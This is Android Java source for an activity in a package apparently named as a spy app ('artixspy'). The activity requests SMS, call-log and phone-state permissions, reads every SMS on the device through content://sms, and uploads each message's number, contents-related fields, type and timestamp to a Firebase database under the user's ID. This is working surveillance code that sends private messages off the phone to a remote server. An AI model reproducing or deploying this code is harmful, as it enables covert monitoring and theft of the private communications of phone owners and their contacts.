package com.example.artixspy;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import android.Manifest;
import android.app.ListActivity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Message;
import android.provider.CallLog;
import android.provider.Telephony;
import android.view.View;
import android.widget.ListView;
import android.widget.Toast;
import android.os.Bundle;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class SmsActivity extends AppCompatActivity {
    private List<String > PermisionNeed = new ArrayList<>();

    private ArrayList<callLogModel> callLogModelArrayList;

    private CallLogAdapter callLogAdapter;
    private  String number,name,type,fulldate,date,time,duration,timeFormated;
    private SwipeRefreshLayout swipeRefreshLayout;
    private RecyclerView recyclerView;

    private static final int REQUEST_CODE = 999;
    String[] appPermission = {
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_SMS
    };

    private int flag = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sms);



        Init();

        getSupportActionBar().setTitle("Sms list");
        for (String item: appPermission){
            if (ContextCompat.checkSelfPermission(this,item)!= PackageManager.PERMISSION_GRANTED)
            {
                PermisionNeed.add(item);
            }
        }
        if (PermisionNeed.isEmpty()){
            FetchCalllogs();

        }
        else if (!PermisionNeed.isEmpty()){
            reqper();
        }
        swipeRefreshLayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                swipeRefreshLayout.setRefreshing(true);
                if (PermisionNeed.isEmpty()){
                    FetchCalllogs();

                }
                else if (!PermisionNeed.isEmpty()){
                    reqper();
                }
                swipeRefreshLayout.setRefreshing(false);

            }
        });
        if(flag ==1){
            reqper();
        }



    }
    void reqper(){
        ActivityCompat.requestPermissions(this, PermisionNeed.toArray(new String[PermisionNeed.size()]), REQUEST_CODE);
    }


    private void Init() {


        swipeRefreshLayout = findViewById(R.id.swipe_refresh_layout);
        recyclerView = findViewById(R.id.main_rcv);
        recyclerView.setHasFixedSize(true);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));
        callLogModelArrayList = new ArrayList<>();
        callLogAdapter = new CallLogAdapter(this,callLogModelArrayList);
        recyclerView.setAdapter(callLogAdapter);


    }
    @RequiresApi(api= Build.VERSION_CODES.R)
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE){
            int x= permissions.length;
            for (int i=0; i <= x-1; i++){
                if (grantResults[i]==PackageManager.PERMISSION_DENIED){
                    flag=1;
                    break;
                }
            }
            if (flag == 0){
                FetchCalllogs();

            }
            else if(flag ==1){
                ActivityCompat.requestPermissions(this, PermisionNeed.toArray(new String[PermisionNeed.size()]), REQUEST_CODE);
            }
        }


    }
    public void FetchCalllogs()
    {
        Toast.makeText(this, "called", Toast.LENGTH_SHORT).show();
        //String sortOrder = android.provider.CallLog.Calls.DATE+" DESC";
       // String sortOrder = Telephony.Sms.DATE+" DESC";

        Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
        callLogModelArrayList.clear();
        final DatabaseReference reference1 = FirebaseDatabase.getInstance().getReference("Chats");
        final String uid = FirebaseAuth.getInstance().getCurrentUser().getUid();
        reference1.child(uid).removeValue();

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do { name = cursor.getString(3);
                number = cursor.getString(2);
                type = cursor.getString(9);
                if(type.equals("1")){
                    type="Recive";

                }
                else if(type.equals("2")){
                    type="Sent";
                }
                fulldate = cursor.getString(5);
                SimpleDateFormat dateFormat= null;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                    dateFormat = new SimpleDateFormat("dd MM yyyy");
                }
                date=dateFormat.format(new Date(Long.parseLong(fulldate)));

                SimpleDateFormat timeformat=new SimpleDateFormat("HH:mm:ss");
                time=timeformat.format(new Date(Long.parseLong(fulldate)));

                timeFormated=getFormatedDateTime(time,"HH:mm:ss","hh:mm a");
                duration = cursor.getString(12);

                callLogModel callLogModel = new callLogModel(number,name,type,date,timeFormated,duration);
                reference1.child(uid).child(number).push().setValue(callLogModel);
                callLogModelArrayList.add(callLogModel);
                // use msgData
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
        }
        callLogAdapter.notifyDataSetChanged();
    }




    private String getFormatedDateTime(String dateStr, String input, String output) {

        String formatted = dateStr;
        DateFormat inputFormat = new SimpleDateFormat(input, Locale.getDefault());
        DateFormat outputFormat = new SimpleDateFormat(output, Locale.getDefault());
        Date date = null;

        try {
            date = inputFormat.parse(dateStr);

        } catch (ParseException e) {
            e.printStackTrace();
        }
        if (date != null){
            formatted = outputFormat.format(date);
        }
        return formatted;

    }


}
